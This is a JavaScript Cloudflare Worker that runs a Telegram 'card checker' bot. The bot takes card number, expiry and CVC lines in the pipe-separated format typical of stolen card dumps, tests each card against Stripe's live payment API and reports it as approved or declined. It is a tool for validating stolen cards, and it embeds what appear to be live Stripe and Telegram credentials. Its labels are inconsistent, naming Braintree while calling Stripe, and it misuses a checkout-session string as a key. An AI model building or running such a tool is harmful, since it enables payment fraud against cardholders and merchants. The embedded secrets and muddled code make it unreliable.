addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  if (request.method === 'POST') {
    const payload = await request.json()
    return handleTelegramUpdate(payload)
  }
  return new Response('OK')
}

async function handleTelegramUpdate(update) {
  if (update.message && update.message.text) {
    const message = update.message
    const text = message.text
    const chatId = message.chat.id

    if (text.startsWith('/chk')) {
      const cardInfo = text.split('\n')[1]
      const [cardNumber, expMonth, expYear, cvc] = cardInfo.split('|')

      try {
        const stripeResponse = await checkCardWithStripe({
          number: cardNumber,
          exp_month: expMonth,
          exp_year: expYear,
          cvc: cvc
        })

        if (stripeResponse.approved) {
          await sendTelegramResponse(chatId, generateApprovedMessage(cardNumber))
        } else {
          await sendTelegramResponse(chatId, generateDeclinedMessage(cardNumber))
        }
      } catch (error) {
        await sendTelegramResponse(chatId, `Error: ${error.message}`)
      }
    }
  }
  return new Response('OK')
}

async function checkCardWithStripe(cardDetails) {
  const stripeKey = await STRIPE_KEY.get('cs_live_a1LbkQ2trb2oarsj1JSvuf4AQkzOlM8TnlX8QDgrfO3AoF8jNNRjJ4qbC5#fidkdWxOYHwnPyd1blppbHNgWjA0SjN8aW1ENkY9Q19KUURMfWt3NTN0PFZ0fDNqX1xjVHxHNkA0ZFwwMDI3TXVDUT1iTzFyVzBxYWN%2FTX1UQ3xESUxBalQ9Z3JhTW99RlByb3Q9X01nTWZuNTVPPFNGX0BvUCcpJ2N3amhWYHdzYHcnP3F3cGApJ2lkfGpwcVF8dWAnPyd2bGtiaWBabHFgaCcpJ2BrZGdpYFVpZGZgbWppYWB3dic%2FcXdwYHgl')
  const response = await fetch('https://api.stripe.com/v1/payment_methods', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': `Bearer ${stripeKey}`
    },
    body: new URLSearchParams({
      type: 'card',
      'card[number]': cardDetails.number,
      'card[exp_month]': cardDetails.exp_month,
      'card[exp_year]': cardDetails.exp_year,
      'card[cvc]': cardDetails.cvc
    })
  })

  const data = await response.json()
  return {
    approved: !data.error,
    response: data
  }
}

function generateApprovedMessage(cardNumber) {
  return `𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n𝐂𝐚𝐫𝐝 ➙ ${cardNumber}\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➙ Approved\n𝐆𝐚𝐭𝐞 ➙ Braintree Auth`
}

function generateDeclinedMessage(cardNumber) {
  return `𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n𝐂𝐚𝐫𝐝 ➙ ${cardNumber}\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➙ Error\n𝐆𝐚𝐭𝐞 ➙ Braintree Auth`
}

async function sendTelegramResponse(chatId, text) {
  const botToken = await TELEGRAM_TOKEN.get('7286429810:AAHBzO7SFy6AjYv8avTRKWQg53CJpD2KEbM')
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    })
  })
}
